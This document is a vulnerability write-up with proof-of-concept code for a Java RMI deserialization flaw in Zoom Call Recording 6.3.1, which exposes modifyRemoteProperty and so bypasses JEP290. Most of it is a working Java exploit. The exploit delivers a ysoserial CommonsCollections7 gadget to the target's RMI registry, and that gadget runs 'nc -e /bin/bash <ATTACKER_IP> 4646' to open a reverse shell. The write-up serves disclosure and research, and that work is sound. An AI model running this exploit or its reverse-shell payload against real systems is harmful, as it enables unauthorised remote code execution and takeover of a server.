# Java RMI Deserialization via Direct Object Insertion into Function Arguments

Zoom Call Recording 6.3.1 from [ZOOM International](https://www.zoomint.com/solutions/call-recording) exposes over RMI the function "modifyRemoteProperty".
<br/>
This function can be used to bypass the JEP290 protection and trigger deserialization at the application level.
<br/>

### Proof Of Concept:

The remote stub function "modifyRemoteProperty(String, String, Object)", directly accept objects in its 3rd parameter.
<br/>
We can use the following Java code to serve ysoserial payloads to the application:

```
import java.rmi.NotBoundException; 
import java.rmi.RemoteException; 
import java.rmi.registry.LocateRegistry; 
import java.rmi.registry.Registry; 
import java.util.Properties; 
import ysoserial.payloads.CommonsCollections7; 

interface IRemoteInfoManager extends Remote {
    String modifyRemoteProperty(String str, String str2, Object obj) throws RemoteException;
}

interface IRemoteApplicationCommunicator extends Remote {
    IRemoteInfoManager getRemoteInfoManager() throws RemoteException;
}
 
public class ExploitZoom { 
 
    public static void main(String[] args) throws RemoteException, NotBoundException, Exception { 
         
        String host = "<TARGET_IP>"; 
        int port = 30400; 
         
        Registry registry = LocateRegistry.getRegistry(host, port);     
        IRemoteApplicationCommunicator remoteApplication = (IRemoteApplicationCommunicator) registry.lookup("remoteCallRec"); 
         
        Object payload = new CommonsCollections7().getObject("/usr/bin/nc -e /bin/bash <ATTACKER_IP> 4646");
        Properties props = System.getProperties();
        props.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        remoteApplication.getRemoteInfoManager().modifyRemoteProperty("Version", "Version", payload); 
     
    } 
     
}
```  

If the exploit is successful, we will receive back a reverse shell on port 4646.

<img src="../Reverse%20Shell.png"/>

### Additional Resources:

[Attacking Java RMI Services After JEP 290](https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
<br/>
[Ysoserial](https://github.com/frohoff/ysoserial)
